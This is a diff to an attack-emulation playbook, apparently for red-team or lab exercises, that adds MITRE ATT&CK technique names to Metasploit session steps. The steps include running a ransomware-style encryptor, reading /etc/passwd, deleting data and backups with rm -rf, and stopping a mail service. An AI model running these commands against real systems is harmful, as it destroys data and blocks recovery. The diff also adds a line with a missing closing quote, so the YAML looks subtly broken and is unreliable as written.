@@ -35,6 +35,7 @@ commands:
     metadata:
       techniques: "T1040"
       tactics: "Credential Access"
+      technique_name: "Network Sniffing"
 
   - type: sleep
     seconds: 20
@@ -176,7 +177,9 @@ commands:
       techniques: "T1080"
       tactics: "Lateral Movement"
       technique_name: "Taint Shared Content"
+
 ################### MOVED ############################################
+
   - type: msf-session
     session: movement
     cmd: sysinfo
@@ -184,7 +187,6 @@ commands:
       techniques: "T1082"
       tactics: "Discovery"
       technique_name: "System Information Discovery"
-
 
   - type: msf-session
     session: movement
@@ -214,7 +216,6 @@ commands:
       tactics: "Impact,Command and Control"
       technique_name:" Data Encrypted for Impact, Ingress Tool Transfer"
 
-
   - type: msf-session
     session: movement
     cmd: /lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images
@@ -235,8 +236,9 @@ commands:
     session: movement
     cmd: cat /etc/passwd
     metadata:
-      techniques: "T1087"
+      techniques: "T1087.001"
       tactics: "Discovery"
+      technique_name: "Account Discovery: Local Account"
   
   - type: msf-session
     session: movement
@@ -244,24 +246,28 @@ commands:
     metadata:
       techniques: "T1531"
       tactics: "Impact"
-  
+      technique_name: "Account Access Removal"
+
   - type: msf-session
     session: movement
     cmd: rm -rf /media/data/*
     metadata:
-     techniques: "T1485"
-     tactics: "Impact"
+      techniques: "T1485"
+      tactics: "Impact
+      technique_name: "Data Destruction"
   
   - type: msf-session
     session: movement
     cmd: rm -rf /var/backups/*
     metadata:
-     techniques: "T1490"
-     tactics: "Impact"
+      techniques: "T1490"
+      tactics: "Impact"
+      technique_name: "Inhibit System Recovery"
 
   - type: msf-session
     session: movement
     cmd: systemctl stop exim4.service
     metadata:
-     techniques: "T1489"
-     tactics: "Impact"
+      techniques: "T1489"
+      tactics: "Impact"
+      technique_name: "Service Stop"
